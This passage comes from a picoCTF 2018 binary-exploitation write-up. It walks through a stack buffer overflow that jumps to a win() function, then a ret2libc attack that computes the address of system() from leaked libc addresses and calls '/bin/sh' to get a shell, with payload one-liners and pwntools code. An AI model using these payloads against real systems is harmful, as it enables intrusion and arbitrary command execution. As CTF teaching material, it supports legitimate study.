</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">win</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> arg1, <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> arg2) {
  [..]
  <span style="color:#ff79c6">if</span> (arg1 <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0xDEADBEEF</span>)
    <span style="color:#ff79c6">return</span>;
  <span style="color:#ff79c6">if</span> (arg2 <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0xDEADC0DE</span>)
    <span style="color:#ff79c6">return</span>;
  <span style="color:#6272a4">/* print the flag here */</span>
}
</code></pre></td></tr></table>
</div>
</div><p>We can use objdump or readelf to find the address of the win function.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">readelf -s vuln | grep win
    66: 080485cb   <span style="color:#bd93f9">123</span> FUNC    GLOBAL DEFAULT   <span style="color:#bd93f9">14</span> win
</code></pre></td></tr></table>
</div>
</div><p>Now we can build a stack representation of the win function desired state:</p>
<pre><code>+---------------------------+
|       0xDEADC0DE          |   arg2
+---------------------------+
|       0xDEADBEEF          |   arg1
+---------------------------+
|       0x????????          |   old ebp
+---------------------------+
|       0x080485CB          |   return address (win function)
+---------------------------+
</code></pre>
<p>Using python, we can simply use pwn to print little endian addresses representation:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> pwn
pwn<span style="color:#ff79c6">.</span>p32(<span style="color:#bd93f9">0x080485cb</span>) <span style="color:#6272a4"># &#39;\xcb\x85\x04\x08&#39;</span>
pwn<span style="color:#ff79c6">.</span>p32(<span style="color:#bd93f9">0xDEADBEEF</span>) <span style="color:#6272a4"># &#39;\xef\xbe\xad\xde&#39;</span>
pwn<span style="color:#ff79c6">.</span>p32(<span style="color:#bd93f9">0xDEADC0DE</span>) <span style="color:#6272a4"># &#39;\xde\xc0\xad\xde&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>The function vuln being vulnerable to buffer overflow, we can now craft a payload:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#ff79c6">-</span>c <span style="color:#f1fa8c">&#34;print &#39;A&#39;*112 + &#39;</span><span style="color:#f1fa8c">\xcb\x85\x04\x08</span><span style="color:#f1fa8c">&#39; + &#39;BBBB&#39; + &#39;</span><span style="color:#f1fa8c">\xef\xbe\xad\xde</span><span style="color:#f1fa8c">&#39; + &#39;</span><span style="color:#f1fa8c">\xde\xc0\xad\xde</span><span style="color:#f1fa8c">&#39;&#34;</span>  <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">./</span>vuln
</code></pre></td></tr></table>
</div>
</div><h2 id="got-2-learn-libc">got-2-learn-libc</h2>
<ul>
<li>source: <a href="./resources/got-2-learn-libc/vuln.c">vuln.c</a></li>
<li>binary: <a href="./resources/got-2-learn-libc/vuln.c">vuln</a></li>
</ul>
<h3 id="spotting-the-buffer-overflow-and-attack-path">Spotting the buffer-overflow and attack path</h3>
<p>The vuln function is vulnerable to buffer-overflow attack.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">char</span> buf[BUFSIZE];
puts(<span style="color:#f1fa8c">&#34;Enter a string:&#34;</span>);
gets(buf);
puts(buf);}
</code></pre></td></tr></table>
</div>
</div><p>The issue with this binary is ASLR being activated. Exploitation of ASLR is possible if we can leak some addresses (e.g format-string &hellip;)</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">checksec vuln
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#39;/home/ctf/ctf_writeups/picoCTF2018/binary-exploitation/resources/got-2-learn-libc/vuln&#39;</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled	&lt;--	ASLR is activated <span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">PIE</span><span style="color:#ff79c6">=</span>Position Independent Executable<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><p>The program kindly show us at runtime the memory address of the <code>useful_string[16] = &quot;/bin/sh&quot;</code> as well as some other libc function (e.g puts, fflush &hellip;).
So instead of looking for a format-string, we can capture those addresses at runtime with pwntools and performed some simple arithmetic to deduct libc system() adresses</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Here are some useful addresses:

puts: 0xf7de0360
fflush 0xf7dde500
read: 0xf7e5e620
write: 0xf7e5e6f0
useful_string: 0x5655f030

Enter a string:
^C
</code></pre></td></tr></table>
</div>
</div><p>Note: The addresses will change between runs due to ASLR. It is possible to disable ASLR locally with the command: <code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code>, but we can&rsquo;t do it on the remote machine.</p>
<p>Being provided the libc functions addresses at runtime, we can guess the libc version in use, its base address and deduct the ASLR offset. Once the offset obtained, we can guess the <code>system()</code> function address as part of a buffer-overflow attack to invoke the useful_string <code>/bin/sh</code></p>
<h3 id="guessing-the-libc-version">Guessing the libc version</h3>
<p>To find the system function address: we first need to guess libc version.</p>
<h4 id="using-ldd">Using ldd</h4>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ldd vuln
    libc.so.6 <span style="color:#ff79c6">=</span>&gt; /lib32/libc.so.6 <span style="color:#ff79c6">(</span>0xf7ddc000<span style="color:#ff79c6">)</span>
ls -la /lib32/libc.so.6
    lrwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">12</span> Apr <span style="color:#bd93f9">16</span>  <span style="color:#bd93f9">2018</span> /lib32/libc.so.6 -&gt; libc-2.27.so
</code></pre></td></tr></table>
</div>
</div><p>On the remote, the same operation shows we are using libc-2.23.so</p>
<h4 id="using-libc-database">using libc-database</h4>
<p>The above operation could have been performed using <a href="https://github.com/niklasb/libc-database">libc-database</a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/niklasb/libc-database
<span style="color:#8be9fd;font-style:italic">cd</span> libc-database
<span style="color:#6272a4">#download all libc versions (it takes a while, so you can cancel download or old archived versions)</span>
./get
<span style="color:#6272a4"># find local libc version by passing the 3 last digits of leaked libc functions&#39; addresses</span>
./find fflush <span style="color:#bd93f9">500</span> <span style="color:#8be9fd;font-style:italic">read</span> <span style="color:#bd93f9">620</span>
http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6-i386_2.27-3ubuntu1_amd64.deb <span style="color:#ff79c6">(</span>id libc6-i386_2.27-3ubuntu1_amd64<span style="color:#ff79c6">)</span>
<span style="color:#6272a4"># repeat the operation on the server</span>
</code></pre></td></tr></table>
</div>
</div><p>local version: libc6-i386_2.27-3ubuntu1_amd64
remote version: libc6-i386_2.23-0ubuntu10_amd64</p>
<h3 id="establish-the-libc_base-address-and-system-function-offset">Establish the libc_base address and system function offset</h3>
<p>We establish the libc base address (prior ASLR offset) with this simple equation:
** libc_base = runtime_address_of_func - symbol_address_of_func **</p>
<h4 id="using-libc-database-1">using libc-database</h4>
<p>We already have the runtime address of the <code>write</code> function from the program output (0xf7e5e6f0), we can use libc-database to get the symbol address:</p>
<ol>
<li>Finding libc_base</li>
</ol>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./dump libc6-i386_2.27-3ubuntu1_amd64 write
<span style="color:#8be9fd;font-style:italic">offset_write</span> <span style="color:#ff79c6">=</span> 0x000e56f0
./dump libc6-i386_2.27-3ubuntu1_amd64 puts
<span style="color:#8be9fd;font-style:italic">offset_puts</span> <span style="color:#ff79c6">=</span> 0x00067360
</code></pre></td></tr></table>
</div>
</div><p>Therefore:</p>
<ul>
<li>locally: libc_base = 0xf7e5e6f0 - 0x000e56f0 = 0xf7de0360 - 0x00067360 = 0xf7d79000</li>
<li>remotely: libc_base = 0xf76d9350 (read) - 0x000d4350 (offset_read) = 0xf7605000</li>
</ul>
<p>Note: It&rsquo;s usually a good sign that the result is 4K aligned.</p>
<ol start="2">
<li>Finding system address</li>
</ol>
<p>We calculate the address of the <code>system()</code> function:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># remote address of system</span>
./dump libc6-i386_2.23-0ubuntu10_amd64 system
<span style="color:#8be9fd;font-style:italic">offset_system</span> <span style="color:#ff79c6">=</span> 0x0003a940
<span style="color:#6272a4"># local address of system</span>
./dump libc6-i386_2.27-3ubuntu1_amd64 system
<span style="color:#8be9fd;font-style:italic">offset_system</span> <span style="color:#ff79c6">=</span> 0x0003cd10
</code></pre></td></tr></table>
</div>
</div><p>Therefore:</p>
<ul>
<li>locally: system_addr = libc_base (0xf7d79000) + offset_system (0x0003cd10) = 0xf7db5d10</li>
<li>remotely: system_addr = libc_base (0xf7605000) + offset_system (0x0003a940) = 0xf763f940</li>
</ul>
<p>Note: the offset will always change as it is randomly set by ASLR.</p>
<h4 id="using-gdb">using gdb</h4>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4">#(gdb) x puts</span>
0xf7e3c380 &lt;puts&gt;:     0x57e58955
<span style="color:#6272a4">#(gdb) x system</span>
0xf7e126e0 &lt;system&gt;:   0x8b0cec83
</code></pre></td></tr></table>
</div>
</div><p>We know puts_addr (runtime address) which is being leaked by the program when launched</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">gdb_puts <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xf7e3c380</span>
gdb_system <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xf7e126e0</span>
puts_addr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xf7de0360</span>
offset <span style="color:#ff79c6">=</span> gdb_puts <span style="color:#ff79c6">-</span> gdb_system
system_addr <span style="color:#ff79c6">=</span> puts_addr <span style="color:#ff79c6">-</span> offset
</code></pre></td></tr></table>
</div>
</div><h4 id="much-simpler-approach-with-the-pwn-library">much simpler approach with the pwn library</h4>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> pwn

<span style="color:#6272a4">#Puts symbols address</span>
vuln <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(<span style="color:#f1fa8c">&#39;./vuln&#39;</span>)
p <span style="color:#ff79c6">=</span> vuln<span style="color:#ff79c6">.</span>process()
prompt <span style="color:#ff79c6">=</span> p<span style="color:#ff79c6">.</span>recv()
puts_addr <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(re<span style="color:#ff79c6">.</span>findall(<span style="color:#f1fa8c">&#39;puts: (.*)&#39;</span>, prompt)[<span style="color:#bd93f9">0</span>],<span style="color:#bd93f9">16</span>)

<span style="color:#6272a4">#libc_base address</span>
libc <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(<span style="color:#f1fa8c">&#34;/lib32/libc.so.6&#34;</span>)
libc_base <span style="color:#ff79c6">=</span> puts_addr <span style="color:#ff79c6">-</span> libc<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#34;puts&#34;</span>]

<span style="color:#6272a4">#Rebase libc</span>
libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> libc_base

<span style="color:#6272a4"># system address in libc</span>
<span style="color:#6272a4">#Not needed since libc was rebased: system_offset = libc[&#34;system&#34;]      # print(hex(libc[&#34;system&#34;])     # &#39;0x3cd10&#39;</span>
<span style="color:#6272a4">#Not needed since libc was rebased: system_addr = p32(libc_base + system_offset)</span>
system_addr <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#34;system&#34;</span>]
</code></pre></td></tr></table>
</div>
</div><h3 id="buffer-overflow-exploitation">Buffer overflow exploitation</h3>
<h4 id="stack-layout-of-the-vuln-function-before-the-overflow">Stack Layout of the vuln function before the overflow:</h4>
<pre><code>+----------+
| ????     | &lt;-- ebp + 0xc &lt;-- We want to override with arguments to be passed to system()
| ????     | &lt;-- ebp + 0x8
+----------+
| ret      | &lt;-- ebp + 0x4 &lt;-- We want to override with the system() function address
| old ebp  | &lt;-- ebp
+----------+
| buf[148] | &lt;-- ebp - 148
|          |
+----------+
</code></pre>
<p>When the <code>vuln</code> function returns, it pops ebp and returns to (ebp + 0x4). So it would be good to override (ebp+4) with the address of the system function <code>system</code>.</p>
<h4 id="stack-layout-after-overflow">Stack Layout after overflow:</h4>
<pre><code>+----------+
| &amp;bin_sh  | &lt;-- ebp + 0xc  &lt;-- arguments for system call is the address of string &quot;/bin/sh&quot;
| JUNK     | &lt;-- ebp + 0x8  &lt;-- fake ret address
+----------+
| &amp;system  | &lt;-- ebp + 0x4  &lt;-- system_address
| AAA..AA  | &lt;-- ebp        &lt;-- 'A'*4
+----------+
| AAA..AA] | &lt;-- ebp - 148  &lt;-- 'A'*(148)
| AAA..AAA |
+----------+
</code></pre>
<h4 id="stack-after-vuln-function-returns">Stack after vuln function returns</h4>
<p>The stack after system call prolog (push ebp, mov ebp, esp) is:</p>
<pre><code>+----------+
| &amp;bin_sh  | &lt;-- ebp + 0x8  &lt;-- arguments for system call
| JUNK     | &lt;-- ebp + 0x4  &lt;-- fake ret address
+----------+
| old ebp  | &lt;-- ebp
+----------+
</code></pre>
<p>Which means that <code>system</code> will treat the address of &ldquo;/bin/sh&rdquo; as its argument, and give us a shell.## Exploit</p>
<h3 id="exploitation">Exploitation</h3>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
